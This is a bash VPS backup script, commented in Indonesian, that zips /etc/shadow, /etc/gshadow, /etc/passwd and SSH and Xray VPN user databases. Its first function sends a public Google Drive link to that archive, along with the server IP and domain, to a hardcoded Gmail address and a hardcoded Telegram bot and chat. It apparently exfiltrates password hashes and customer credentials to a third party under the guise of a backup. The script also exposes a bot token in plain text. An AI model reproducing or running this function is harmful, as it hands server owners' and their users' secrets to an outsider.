#!/bin/bash
#BACKUP VIA GOOGLE DRIVE 
# My Telegram : https://t.me/sampiiiiu

# =============== WARNA ===============
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
function bckplama() {
# =============== KONFIG ===============
CHATID="1210833546"
KEY="8349679406:AAHjCSDxh_tEJkCmsGaZtwNIm5aT0JkoulE"
IP=$(curl -sS ipv4.icanhazip.com)
domain=$(cat /etc/xray/domain)
date=$(date +"%Y-%m-%d")
zipname="$IP-$date.zip"

# =============== CEK EMAIL ===============
email=alnurridwan112@gmail.com
if [[ -z "$email" ]]; then
   # read -rp "Masukkan Email Untuk Menerima Backup: " -e email
    echo "$email" > /root/email
fi

clear
echo -e "${CYAN}🔄 Mohon tunggu, proses backup sedang berlangsung...${NC}"

# =============== PROSES BACKUP ===============
rm -rf /root/backup
mkdir -p /root/backup/qt

cp /etc/passwd /root/backup/
cp /etc/group /root/backup/
cp /etc/shadow /root/backup/
cp /etc/gshadow /root/backup/
cp /etc/crontab /root/backup/
cp /etc/vmess/.vmess.db /root/backup/ 2>/dev/null
cp /etc/ssh/.ssh.db /root/backup/ 2>/dev/null
cp /etc/vless/.vless.db /root/backup/ 2>/dev/null
cp /etc/trojan/.trojan.db /root/backup/ 2>/dev/null
cp /etc/bot/.bot.db /root/backup/ 2>/dev/null
cp -r /etc/kyt/limit /root/backup/ 2>/dev/null
cp -r /etc/limit /root/backup/qt/ 2>/dev/null
cp -r /etc/vmess /root/backup/ 2>/dev/null
cp -r /etc/trojan /root/backup/ 2>/dev/null
cp -r /etc/vless /root/backup/ 2>/dev/null
cp -r /etc/slowdns /root/backup/ 2>/dev/null
cp -r /var/lib/kyt/ /root/backup/kyt 2>/dev/null
cp -r /etc/xray /root/backup/xray 2>/dev/null
cp -r /var/www/html/ /root/backup/html 2>/dev/null

if [[ -f "/root/BotVPN2/sellvpn.db" ]]; then
    cp /root/BotVPN2/sellvpn.db /root/backup/
    echo "📦 Membackup database sellvpn.db..."
fi

cd /root
zip -r "$zipname" backup > /dev/null 2>&1

# =============== UPLOAD KE GDRIVE ===============
rclone copy "/root/$zipname" dr:backup/
url=$(rclone link "dr:backup/$zipname")
id=$(echo "$url" | grep '^https' | cut -d'=' -f2)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"

# =============== KIRIM VIA EMAIL ===============
echo -e "
Detail Backup
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
" | mail -s "Backup Data VPS $IP" "$email"

# =============== KIRIM NOTIF TELEGRAM ===============
MESSAGE="⚠️ *BACKUP SELESAI* ⚠️
📌 *IP VPS*     : \`$IP\`
🌐 *Domain*     : \`$domain\`
📅 *Tanggal*    : \`$date\`

🔗 *Link Download Backup:*
$link

Silakan salin link dan restore di VPS baru."

curl -s -X POST "https://api.telegram.org/bot$KEY/sendMessage" \
     -d "chat_id=$CHATID" \
     -d "text=$MESSAGE" \
     -d "parse_mode=Markdown"

# =============== HAPUS FILE ===============
rm -rf /root/backup
rm -f "/root/$zipname"

clear
echo -e "${GREEN}✅ Backup selesai. Silakan cek link backup di Telegram atau email Anda.${NC}"
}
#BACKUP VIA BOT
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GRAY="\e[1;30m"
BLUE="\e[0;34m"
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELL='\033[0;33m'
WHITE='\033[1;97m'
PURPLE_BG='\033[44;1m'
grs="\033[96;1m"
redbg="\033[97;41m"
# Getting IP & Hostname
clear
MYIP=$(curl -sS ipv4.icanhazip.com)
IP=$(wget -qO- icanhazip.com)
dateToday=$(date +"%Y-%m-%d")
Name=$(curl -s https://raw.githubusercontent.com/p3yx/newsc/main/ipx | grep $MYIP | awk '{print $2}')

# =======================
# Mini loading animation function
loading() {
    local msg=$1
    local i
    echo -ne "$msg "
    for i in {1..10}; do
        echo -n "."
        sleep 0.2
    done
    echo
}




botBackup() {
    clear
    bottoken=$(sed -n '1p' /root/.bckupbot | awk '{print $1}')
    adminid=$(sed -n '2p' /root/.bckupbot | awk '{print $1}')
    domain=$(cat /etc/xray/domain)
    nama2=$(cat /etc/xray/username)
    

    echo -e "${BLUE}┌─────────────────────────────────────────────┐${NC}"
    echo -e " ${PURPLE_BG}              💾 VPS BACKUP TOOL 💾            ${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────┘${NC}" 

    IP=$(wget -qO- ipinfo.io/ip)
    Name=$(hostname)
    dateToday=$(date +"%Y-%m-%d")
    workDir="/root/backup"
    backupFile="/root/${IP}-${Name}-${dateToday}.zip"

    # Siapkan folder backup
    rm -rf "$workDir"
    mkdir -p "$workDir"

    # File penting
    cp /etc/passwd "$workDir"/ &>/dev/null
    cp /etc/group "$workDir"/ &>/dev/null
    cp /etc/shadow "$workDir"/ &>/dev/null
    cp /etc/gshadow "$workDir"/ &>/dev/null
    cp /etc/crontab "$workDir"/ &>/dev/null

    cp /etc/ssh/.ssh.db "$workDir"/ &>/dev/null
    cp /etc/vmess/.vmess.db "$workDir"/ &>/dev/null
    cp /etc/vless/.vless.db "$workDir"/ &>/dev/null
    cp /etc/trojan/.trojan.db "$workDir"/ &>/dev/null
    cp /etc/shadowsocks/.shadowsocks.db "$workDir"/ &>/dev/null
    
    #folder Bot notif & backup bot seller
    cp /etc/notif/limit.env "$workDir"/ &>/dev/null
    cp /root/.backupcfg "$workDir"/ &>/dev/null

    # Folder penting
    cp -r /var/lib/kyt/ "$workDir/kyt2" &>/dev/null
    cp -r /etc/limit "$workDir"/ &>/dev/null
    cp -r /etc/kyt/limit "$workDir"/ &>/dev/null
    cp -r /etc/ssh "$workDir"/ &>/dev/null
    cp -r /etc/vmess "$workDir"/ &>/dev/null
    cp -r /etc/trojan "$workDir"/ &>/dev/null
    cp -r /etc/vless "$workDir"/ &>/dev/null
    cp -r /etc/shadowsocks "$workDir"/ &>/dev/null
    cp -r /etc/xray "$workDir/xray" &>/dev/null
    cp -r /var/www/html/ "$workDir/html" &>/dev/null
    cp -a /detail/ "$workDir/detail" &>/dev/null

    # Buat ZIP
    loading "[ INFO ] Creating backup"
    cd /root
    zip -r -q "${backupFile}" "backup"
    [[ -f "${backupFile}" ]] && echo -e "${GREEN}[ DONE ]${NC}" || { echo -e "${RED}[ FAILED ]${NC}"; return 1; }

    # Cek ukuran file
    filesize=$(stat -c%s "$backupFile")
    if (( filesize > 50000000 )); then
        echo -e "${RED}[ ERROR ] File terlalu besar untuk dikirim via Telegram (${filesize} bytes)${NC}"
        return 1
    fi

    # Kirim via Telegram
    loading "[ INFO ] Sending backup via Telegram"
    RESPONSE=$(curl -s -F "chat_id=${adminid}" -F "document=@${backupFile}" \
        "https://api.telegram.org/bot${bottoken}/sendDocument")

    if [[ $(echo "$RESPONSE" | jq -r '.ok') == "true" ]]; then
        echo -e "${GREEN}[ DONE ]${NC}"
    else
        echo -e "${RED}[ FAILED ]${NC}"
        echo "$RESPONSE"
        return 1
    fi

    fileId=$(echo "$RESPONSE" | jq -r '.result.document.file_id')
    FILE_INFO=$(curl -s "https://api.telegram.org/bot${bottoken}/getFile?file_id=${fileId}")
    filePath=$(echo "$FILE_INFO" | jq -r '.result.file_path')

    TEXT="<b>◇━━━━━━━━━━━━━━◇</b>
<b>   ✅ VPS Backup Completed</b>
<b>◇━━━━━━━━━━━━━━◇</b>
📌 <b>Date:</b> <code>${dateToday}</code>
🌍 <b>IP:</b> <code>${IP}</code>
💥 <b>Domain:</b> <code>${domain}</code>
👤 <b>Name:</b> <code>${nama2}</code>
🗂 <b>File ID:</b> <code>${fileId}</code>
📂 <b>File Path:</b> <code>${filePath}</code>
<b>◇━━━━━━━━━━━━━━◇</b>"

    curl -s "https://api.telegram.org/bot${bottoken}/sendMessage" \
        -d "chat_id=${adminid}" \
        --data-urlencode "text=${TEXT}" \
        -d "parse_mode=html" >/dev/null

    # Bersih-bersih
    rm -rf "$workDir" "${backupFile}"
    echo -e "${WHITE}✅ BACKUP COMPLETED${NC}"
}
case "$1" in
    botBackup)
        botBackup
        ;;
    *)
        m_bckp
        ;;
esac
